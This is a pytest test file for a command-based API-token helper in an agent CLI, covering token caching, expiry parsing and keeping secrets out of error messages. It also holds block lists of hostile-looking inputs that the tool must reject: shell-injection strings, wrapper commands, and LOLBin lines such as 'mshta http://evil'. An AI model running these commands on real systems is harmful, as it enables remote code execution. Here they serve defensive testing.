"""``key_cmd``: derive a provider API key by running a command.

Gateways that issue short-lived bearers (SSO/OIDC brokers, cloud IAM, internal
auth proxies) make a stored key go stale mid-session. These tests pin the three
behaviours that make the feature work:

* resolution yields a CALLABLE (invoked per request) rather than a resolved
  string, so a long session never sends a stale token;
* the token is cached until shortly before expiry, so the command is not run
  once per request;
* a failure never leaks the helper's output or the command string, either of
  which can contain a credential.
"""

from __future__ import annotations

import json
import shlex
import subprocess
import sys
import time
from types import SimpleNamespace

import pytest

from agent.command_token_source import (
    CommandTokenError,
    CommandTokenSource,
    _mint,
    _parse_command_argv,
    build_command_token_provider,
)


def _python_command(code: str) -> str:
    argv = [sys.executable, "-c", code]
    if sys.platform == "win32":
        # Force quoting for Python snippets containing shell-like punctuation;
        # native Windows argv parsing otherwise leaves ``print(...)`` unquoted.
        return subprocess.list2cmdline([sys.executable, "-c", f"{code} "])
    return " ".join(shlex.quote(part) for part in argv)


def _python_print(value: str) -> str:
    return _python_command(f"print({value!r}, end='')")


class TestMinting:
    def test_default_execution_uses_argv_without_shell(self, monkeypatch):
        seen = {}

        def fake_run(command, **kwargs):
            seen["command"] = command
            seen["shell"] = kwargs.get("shell")
            return SimpleNamespace(returncode=0, stdout="tok-safe", stderr="")

        monkeypatch.setattr("agent.command_token_source.subprocess.run", fake_run)

        assert _mint("token-helper --profile prod", "dbx") == ("tok-safe", None)
        assert seen == {
            "command": ["token-helper", "--profile", "prod"],
            "shell": False,
        }

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            (
                r"helper --config C:\Users\andre\config.json",
                ["helper", "--config", r"C:\Users\andre\config.json"],
            ),
            (
                r'"C:\Program Files\helper.exe" --path C:\tmp\token',
                [
                    r"C:\Program Files\helper.exe",
                    "--path",
                    r"C:\tmp\token",
                ],
            ),
            (
                "helper --path C:\\tmp\\",
                ["helper", "--path", "C:\\tmp\\"],
            ),
        ],
    )
    def test_windows_parser_preserves_native_backslashes(self, command, expected):
        if sys.platform != "win32":
            pytest.skip("native backslash parsing is Windows-specific")
        assert _parse_command_argv(command, "dbx") == expected

    @pytest.mark.parametrize(
        "command",
        [
            'cmd.exe /d /c "echo pwned > marker"',
            'powershell -NoProfile -Command "Set-Content marker pwned"',
            'pwsh -NoProfile -c "Set-Content marker pwned"',
            'sh -c "echo pwned > marker"',
            'bash -c "echo pwned > marker"',
        ],
    )
    def test_shell_launchers_are_rejected_before_execution(self, monkeypatch, command):
        def fail_if_called(*args, **kwargs):
            raise AssertionError("shell launcher must be rejected before process creation")

        monkeypatch.setattr("agent.command_token_source.subprocess.run", fail_if_called)
        with pytest.raises(CommandTokenError, match="shell"):
            _mint(command, "dbx")

    @pytest.mark.parametrize("command", [
        'env -u SECRET bash -c "echo pwned"',
        'env --split-string="bash -c echo"',
        'nice bash -c "echo pwned"',
        'nohup sh -c "echo pwned"',
        'xargs -0 bash -c "echo pwned"',
        'wsl sh -c "echo pwned"',
    ])
    def test_process_dispatch_wrappers_are_rejected(self, monkeypatch, command):
        monkeypatch.setattr(
            "agent.command_token_source.subprocess.run",
            lambda *args, **kwargs: (_ for _ in ()).throw(AssertionError("must not spawn")),
        )
        with pytest.raises(CommandTokenError, match="process wrapper"):
            _mint(command, "dbx")

    def test_nul_command_is_normalized_to_provider_error(self):
        with pytest.raises(CommandTokenError, match="could not be parsed") as excinfo:
            _mint("helper\x00--token", "dbx")
        assert "helper" not in str(excinfo.value)

    def test_shell_injection_marker_never_runs(self, tmp_path):
        marker = tmp_path / "marker"
        python = sys.executable.replace("\\", "/")
        marker_path = marker.as_posix()
        first = (
            f'"{python}" -c "from pathlib import Path; '
            f"Path(r'{marker_path}').write_text('pwned')\""
        )
        second = f'"{python}" -c "print(\'tok\')"'
        separator = "&" if sys.platform == "win32" else ";"

        with pytest.raises(CommandTokenError):
            _mint(f"{first} {separator} {second}", "dbx")

        assert not marker.exists(), "shell metacharacters must not run a second operation"

    def test_bare_token_stdout(self):
        source = CommandTokenSource(_python_command("print('tok-abc', end='')"), "dbx")
        assert source() == "tok-abc"

    def test_json_access_token(self):
        """The OAuth 2.0 token-endpoint response shape."""
        source = CommandTokenSource(
            _python_command(
                "print('{\"access_token\":\"tok-json\",\"expires_in\":3600}', end='')"
            ),
            "dbx",
        )
        assert source() == "tok-json"

    def test_trailing_newline_is_stripped(self):
        """A raw newline in the credential would corrupt the auth header."""
        assert CommandTokenSource(_python_command("print('tok-nl')"), "dbx")() == "tok-nl"

    def test_multiline_output_is_rejected_not_guessed(self):
        """Only the token may land on stdout.

        Silently taking the first line turns a misconfigured helper (banner,
        warning, two tokens) into a corrupt-credential 401 that is much harder
        to diagnose than an explicit refusal.
        """
        source = CommandTokenSource(
            _python_command("print('banner\\ntok-real', end='')"), "dbx"
        )
        with pytest.raises(CommandTokenError, match="multiple lines"):
            source()

    def test_json_without_access_token_is_an_error(self):
        source = CommandTokenSource(_python_command("print('{\"nope\":1}', end='')"), "dbx")
        with pytest.raises(CommandTokenError, match="access_token"):
            source()

    def test_empty_output_is_an_error(self):
        with pytest.raises(CommandTokenError, match="no output"):
            CommandTokenSource(_python_command("pass"), "dbx")()

    def test_nonzero_exit_is_an_error(self):
        with pytest.raises(CommandTokenError, match="exited 3"):
            CommandTokenSource(_python_command("raise SystemExit(3)"), "dbx")()

    def test_failure_message_is_actionable_without_echoing_the_command(self):
        """Actionable, but never echoes the command (it may embed a secret)."""
        secret_cmd = _python_command(
            "import sys; print('SENTINEL-SECRET', file=sys.stderr); raise SystemExit(1)"
        )
        with pytest.raises(CommandTokenError) as excinfo:
            CommandTokenSource(secret_cmd, "dbx")()
        message = str(excinfo.value)
        assert "SENTINEL-SECRET" not in message
        assert "dbx" in message          # names the provider to fix
        assert "exited" in message       # states what happened


class TestNoCredentialLeak:
    def test_failure_message_excludes_command_output(self):
        """A failing auth helper may print a token — it must not be surfaced."""
        source = CommandTokenSource(
            _python_command(
                "import sys; print('SENTINEL-SECRET', file=sys.stdout); "
                "print('stderr-SENTINEL', file=sys.stderr); raise SystemExit(1)"
            ),
            "dbx",
        )
        with pytest.raises(CommandTokenError) as excinfo:
            source()
        assert "SENTINEL" not in str(excinfo.value)


class TestCaching:
    def test_token_is_cached_between_calls(self):
        """Without caching the command would run on every request."""
        # A command whose output changes each run: equal results prove caching.
        source = CommandTokenSource(
            _python_command("import time; print(time.time_ns(), end='')"), "dbx"
        )
        assert source() == source()

    def test_expired_token_is_reminted(self):
        # time_ns changes every run and is available on every supported OS.
        source = CommandTokenSource(
            _python_command(
                "import json, time; print(json.dumps({"
                "'access_token': f'tok-{time.time_ns()}', 'expires_in': 3600"
                "}), end='')"
            ),
            "dbx",
        )
        first = source()
        # Force the cache past its expiry.
        source._expires_at = 0.0
        assert source() != first

    def test_no_advertised_ttl_caches_on_a_bounded_window(self):
        """No TTL means a bounded cache, not a process-lifetime one.

        Nothing in the request path re-mints on 401 (SDK retries cover
        429/5xx only), so caching forever would wedge an expired token until
        restart. The window keeps the helper from running per-request while
        guaranteeing an eventual re-mint.
        """
        from agent.command_token_source import _NO_TTL_REFRESH_SECONDS

        source = CommandTokenSource(
            _python_command("import time; print(time.time_ns(), end='')"), "dbx"
        )
        first = source()
        assert 0 < source._expires_at - time.monotonic() <= _NO_TTL_REFRESH_SECONDS
        assert source() == first  # cached inside the window
        source._expires_at = time.monotonic() - 1  # cross the window
        assert source() != first  # re-minted after it

    def test_advertised_ttl_sets_an_expiry(self):
        source = CommandTokenSource(
            _python_print('{"access_token":"tok","expires_in":3600}'), "dbx"
        )
        source()
        assert source._expires_at is not None

    def test_ttl_shorter_than_the_leeway_still_caches_briefly(self):
        """A leeway larger than the TTL must not disable caching entirely."""
        source = CommandTokenSource(
            _python_print('{"access_token":"tok","expires_in":1}'), "dbx"
        )
        source()
        assert source._expires_at is not None
        assert source._expires_at > 0.0


class TestBuilder:
    def test_returns_none_when_unset(self):
        assert build_command_token_provider("") is None
        assert build_command_token_provider("   ") is None

    def test_returns_callable_when_set(self):
        provider = build_command_token_provider("printf tok", "dbx")
        assert callable(provider)
        assert provider() == "tok"


class TestResolutionYieldsACallable:
    """The integration contract: a callable reaches the wire client."""

    def test_key_cmd_entry_resolves_to_a_callable(self, monkeypatch):
        from hermes_cli import runtime_provider as rp

        config = {
            "providers": {
                "dbx": {
                    "base_url": "https://example.invalid/v1",
                    "api_mode": "chat_completions",
                    "model": "m1",
                    "key_cmd": "printf minted-token",
                }
            }
        }
        monkeypatch.setattr(rp, "load_config", lambda *a, **k: config)
        monkeypatch.setattr("hermes_cli.config.load_config", lambda *a, **k: config)

        runtime = rp.resolve_runtime_provider(requested="custom:dbx")
        api_key = runtime["api_key"]
        assert callable(api_key), "key_cmd must resolve to a per-request callable"
        assert api_key() == "minted-token"

    def test_explicit_api_key_still_wins(self, monkeypatch):
        """``--api-key`` stays the one-off recovery escape hatch."""
        from hermes_cli import runtime_provider as rp

        config = {
            "providers": {
                "dbx": {
                    "base_url": "https://example.invalid/v1",
                    "api_mode": "chat_completions",
                    "model": "m1",
                    "key_cmd": "printf minted-token",
                }
            }
        }
        monkeypatch.setattr(rp, "load_config", lambda *a, **k: config)
        monkeypatch.setattr("hermes_cli.config.load_config", lambda *a, **k: config)

        runtime = rp.resolve_runtime_provider(
            requested="custom:dbx", explicit_api_key="sk-explicit-override"
        )
        assert runtime["api_key"] == "sk-explicit-override"


class TestCallableKeyGetsBearerAuth:
    """A callable api_key must reach the Anthropic bearer-hook client path.

    This is why key_cmd needs no per-vendor auth wiring: a static string is
    sent as ``x-api-key`` (which OAuth-gated gateways reject with 401), while a
    callable routes through the per-request ``Authorization: Bearer`` hook the
    Entra ID path already established. Verified against a live gateway with the
    SAME token value: static -> 401, callable -> 200.
    """

    def test_callable_takes_the_bearer_hook_path(self, monkeypatch):
        import agent.anthropic_adapter as aa

        seen = {}

        def _fake_hook(api_key, base_url, timeout, **kw):
            seen["callable"] = callable(api_key)
            return object()

        monkeypatch.setattr(
            aa, "_build_anthropic_client_with_bearer_hook", _fake_hook
        )
        aa.build_anthropic_client(
            lambda: "minted-token", "https://gateway.invalid/anthropic"
        )
        assert seen.get("callable") is True


class TestAbsoluteExpiry:
    """Helpers that advertise a deadline instead of a lifetime.

    OAuth 2.0 token endpoints send a relative ``expires_in``, but CLI token
    helpers commonly print an absolute ISO 8601 timestamp instead (Databricks
    ``expiry``, older Azure ``expiresOn``). Reading only ``expires_in`` treats
    those as "no TTL advertised", caches the token for the life of the process,
    and every request 401s once the real deadline passes.
    """

    @staticmethod
    def _iso(seconds_from_now: float) -> str:
        from datetime import datetime, timedelta, timezone

        return (
            datetime.now(timezone.utc) + timedelta(seconds=seconds_from_now)
        ).isoformat()

    def test_iso_expiry_yields_a_ttl(self):
        deadline = self._iso(3600)
        payload = json.dumps({"access_token": "t", "expiry": deadline})
        _, ttl = _mint(_python_print(payload), "p")
        assert ttl is not None, "an advertised deadline must produce a TTL"
        assert 3500 < ttl <= 3600

    def test_azure_expires_on_spelling(self):
        deadline = self._iso(1800)
        payload = json.dumps({"access_token": "t", "expiresOn": deadline})
        _, ttl = _mint(_python_print(payload), "p")
        assert ttl is not None and 1700 < ttl <= 1800

    def test_expires_in_still_wins_when_both_present(self):
        """The RFC 6749 field is authoritative where a helper sends both."""
        deadline = self._iso(3600)
        payload = json.dumps(
            {"access_token": "t", "expires_in": 120, "expiry": deadline}
        )
        _, ttl = _mint(_python_print(payload), "p")
        assert ttl == 120.0

    def test_unparseable_expiry_is_not_a_ttl(self):
        """Junk must fall back to refresh-on-401, never to a guessed deadline."""
        _, ttl = _mint(_python_print('{"access_token":"t","expiry":"whenever"}'), "p")
        assert ttl is None

    def test_already_past_expiry_is_not_a_ttl(self):
        """A stale deadline must not become a negative or zero TTL."""
        payload = json.dumps({"access_token": "t", "expiry": self._iso(-60)})
        _, ttl = _mint(_python_print(payload), "p")
        assert ttl is None

    def test_the_token_actually_gets_re_minted(self, tmp_path):
        """The regression that mattered: a deadline must expire the cache."""
        counter = tmp_path / "calls"
        cmd = _python_command(
            "import json; from pathlib import Path; "
            f"p=Path({str(counter)!r}); p.open('a').write('x'); "
            f"print(json.dumps({{'access_token': 't', 'expiry': {self._iso(1)!r}}}), end='')"
        )
        src = CommandTokenSource(cmd, "p")
        src()
        assert src._expires_at is not None, "cache must carry a deadline"
        src._expires_at = time.monotonic() - 1  # simulate crossing it
        src()
        assert len(counter.read_text()) == 2, "expired cache must re-run the helper"


class TestAuxiliaryResolverHonoursKeyCmd:
    """Auxiliary tasks resolve credentials on their own path.

    ``agent.auxiliary_client.resolve_provider_client`` does not go through
    ``_resolve_named_custom_runtime``, so a key_cmd honoured only there leaves
    title generation, compression, vision and embedding falling back to the
    ``no-key-required`` placeholder — the main agent turn succeeds while every
    auxiliary call 401s.
    """

    @staticmethod
    def _resolve(monkeypatch, entry):
        """Resolve *entry* as a named custom provider; return the api_key seen."""
        import agent.auxiliary_client as ac
        from hermes_cli import runtime_provider as rp

        monkeypatch.setattr(
            rp, "_get_named_custom_provider",
            lambda name: dict(entry, name="dbx") if name == "dbx" else None,
        )
        seen = {}

        def _spy(*, api_key, base_url, **kw):
            seen["api_key"] = api_key
            return SimpleNamespace(api_key=api_key, base_url=base_url)

        monkeypatch.setattr(ac, "_create_openai_client", _spy)
        ac.resolve_provider_client("dbx")
        return seen.get("api_key")

    BASE = {"base_url": "https://example.invalid/v1", "model": "m1"}

    def test_key_cmd_resolves_to_a_callable(self, monkeypatch):
        api_key = self._resolve(monkeypatch, {**self.BASE, "key_cmd": "printf minted-token"})
        assert callable(api_key), "auxiliary tasks must mint per request too"
        assert api_key() == "minted-token"

    def test_key_cmd_beats_static_credentials(self, monkeypatch):
        """Precedence matches the runtime resolver, so both agree on one entry."""
        api_key = self._resolve(
            monkeypatch,
            {**self.BASE, "api_key": "stale-static", "key_cmd": "printf minted-token"},
        )
        assert callable(api_key) and api_key() == "minted-token"

    def test_static_credentials_still_resolve(self, monkeypatch):
        assert self._resolve(monkeypatch, {**self.BASE, "api_key": "static"}) == "static"

    def test_blank_key_cmd_keeps_the_placeholder(self, monkeypatch):
        """A blank command must not become a callable that mints nothing."""
        assert self._resolve(
            monkeypatch, {**self.BASE, "key_cmd": "   "}
        ) == "no-key-required"


class Test98831Beyond97217:
    """98831 hardening beyond 97217 — extended wrappers, LOLBins, limits.

    97217 blocks direct shells + 12 wrappers + shell syntax. 98831 adds:
    bwrap/firejail/flatpak/nsenter/chroot/proot/docker/podman/runc/crun,
    capsh/su/sg/systemd-run/unshare/fakeroot, LOLBins (rundll32/regsvr32/mshta),
    length/token/control-char limits, and warning audit trail.
    Each blocked test is a pre-effect process-boundary regression: it drives
    _mint() with subprocess.run monkeypatched to fail if reached. Each allowed
    test drives _mint() with a fake runner and asserts exact argv + shell=False.
    """

    def _assert_blocked_via_mint(self, monkeypatch, caplog, command: str, expect_log: str | None = None):
        """Helper: command must be rejected BEFORE subprocess.run (pre-effect)."""
        called = {}

        def fake_run(*a, **k):
            called["ran"] = True
            raise AssertionError(f"{command!r} reached subprocess.run — must be rejected pre-effect")

        monkeypatch.setattr("agent.command_token_source.subprocess.run", fake_run)
        caplog.clear()
        with pytest.raises(CommandTokenError):
            _mint(command, "test")
        assert "ran" not in called, f"{command!r} should not reach subprocess.run"
        if expect_log:
            # warning audit trail (SOC visibility) must be observable
            assert expect_log in caplog.text, f"expected warning {expect_log!r} not in caplog: {caplog.text!r}"

    def test_extended_wrappers_blocked(self, monkeypatch, caplog):
        for cmd in [
            "bwrap --ro-bind / / helper",
            "firejail helper --arg",
            "flatpak run helper",
            "nsenter helper",
            "chroot / helper",
            "proot helper",
            "docker run helper",
            "podman run helper",
            "runc run helper",
            "crun run helper",
            "capsh --print helper",
            "su helper",
            "sg helper",
            "systemd-run helper",
            "unshare helper",
            "fakeroot helper",
            "fakechroot helper",
        ]:
            self._assert_blocked_via_mint(monkeypatch, caplog, cmd, expect_log="blocked wrapper")

    def test_lolbins_blocked(self, monkeypatch, caplog):
        for cmd in [
            "rundll32 javascript:evil",
            "rundll32.exe javascript:evil",
            "regsvr32 /s evil.dll",
            "regsvr32.exe evil.dll",
            "mshta http://evil",
            "mshta.exe http://evil",
        ]:
            self._assert_blocked_via_mint(monkeypatch, caplog, cmd, expect_log="blocked LOLBin")

    def test_busybox_without_exe_blocked(self, monkeypatch, caplog):
        # 97217 had busybox.exe but not busybox (POSIX); 98831 fixes
        self._assert_blocked_via_mint(monkeypatch, caplog, "busybox sh -c 'echo hi'", expect_log="blocked shell")
        self._assert_blocked_via_mint(monkeypatch, caplog, "busybox --help", expect_log="blocked shell")

    def test_length_and_token_limits(self, monkeypatch, caplog):
        # _MAX_COMMAND_CHARS=4096, _MAX_ARGV_TOKENS=64
        long_cmd = "helper " + "x" * 5000
        self._assert_blocked_via_mint(monkeypatch, caplog, long_cmd)
        many_tokens = "helper " + " ".join(f"arg{i}" for i in range(70))
        self._assert_blocked_via_mint(monkeypatch, caplog, many_tokens)

    def test_control_chars_blocked(self, monkeypatch, caplog):
        self._assert_blocked_via_mint(monkeypatch, caplog, "helper\x00injected")
        self._assert_blocked_via_mint(monkeypatch, caplog, "helper\x01bad")
        self._assert_blocked_via_mint(monkeypatch, caplog, "helper\rbad")
        self._assert_blocked_via_mint(monkeypatch, caplog, "helper\nbad")

    def test_legitimate_helpers_still_allowed(self, monkeypatch):
        # Allowed-case positive execution controls: must reach subprocess.run
        # with exact argv and shell=False and return the token.
        cases = [
            ("my-auth-cli print-token --profile prod", ["my-auth-cli", "print-token", "--profile", "prod"]),
            ("python my-helper.py --arg", ["python", "my-helper.py", "--arg"]),
            ("/usr/local/bin/helper --config /tmp/x", ["/usr/local/bin/helper", "--config", "/tmp/x"]),
        ]
        # Windows native quoting preserves backslashes; on POSIX shlex mangles
        # C:\tmp -> C:tmp, so only assert the Windows exe case on Windows.
        if sys.platform == "win32":
            cases.append(('"C:\\Program Files\\helper.exe" --path C:\\tmp\\token', ["C:\\Program Files\\helper.exe", "--path", "C:\\tmp\\token"]))
        for cmd, expected_argv in cases:
            seen = {}

            def fake_run(argv, **kwargs):
                seen["argv"] = argv
                seen["shell"] = kwargs.get("shell")
                return SimpleNamespace(returncode=0, stdout="tok", stderr="")

            monkeypatch.setattr("agent.command_token_source.subprocess.run", fake_run)
            result = _mint(cmd, "test")
            assert result == ("tok", None), f"{cmd!r} should mint tok"
            assert seen["argv"] == expected_argv, f"{cmd!r} argv mismatch"
            assert seen["shell"] is False, f"{cmd!r} must use shell=False"

    def test_executable_path_with_equals_allowed(self, monkeypatch):
        # argv contract must not reserve "=": ./auth=prod, bin/auth=prod,
        # and Windows C:\Tools\auth=prod.exe are valid executable names.
        cases = [
            ("./auth=prod --token", "./auth=prod"),
            ("bin/auth=prod --flag", "bin/auth=prod"),
            ("/opt/auth=prod/helper --x", "/opt/auth=prod/helper"),
        ]
        if sys.platform == "win32":
            cases.append(('"C:\\Tools\\auth=prod.exe" --arg', "C:\\Tools\\auth=prod.exe"))
        for cmd, expected_first in cases:
            seen = {}

            def fake_run(argv, **kwargs):
                seen["argv"] = argv
                seen["shell"] = kwargs.get("shell")
                return SimpleNamespace(returncode=0, stdout="tok-equals", stderr="")

            monkeypatch.setattr("agent.command_token_source.subprocess.run", fake_run)
            result = _mint(cmd, "test")
            assert result == ("tok-equals", None)
            assert seen["argv"][0] == expected_first
            assert seen["shell"] is False
